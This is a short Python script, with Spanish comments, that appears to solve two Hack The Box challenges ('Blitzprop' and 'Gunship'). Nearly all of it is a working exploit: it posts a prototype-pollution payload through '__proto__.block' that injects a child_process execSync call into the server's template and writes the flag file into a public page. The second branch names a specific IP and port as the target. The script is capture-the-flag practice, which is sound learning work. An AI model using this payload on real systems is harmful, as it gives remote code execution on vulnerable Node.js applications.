import requests

print("1) Blitzprop \n2) Gunship")

ataque = input("Reto a resolver: ")

if (ataque == "1"):
    TARGET_URL = 'http://127.0.0.1:1337'
    requests.post(TARGET_URL+'/api/submit',json={
        "song.name" : "ASTa la vista baby",
        "__proto__.block":{
        "type":"Text",
        "line":"process.mainModule.require('child_process').execSync(`cat flag* > views/index.html`).toString()"
        }
    })

requests.get(TARGET_URL)

'''Depende del URL que te de el hack the box'''

if (ataque == "2"):
    TARGET_URL = 'http://157.245.44.97:31503'
    requests.post(TARGET_URL+'/api/submit',json={
        "artist.name":"Alex Westaway",
        "__proto__.block":{
        "type":"Text",
        "line":"process.mainModule.require('child_process').execSync(`cat flag* > views/index.html`).toString()"
        }
    })
requests.get(TARGET_URL)



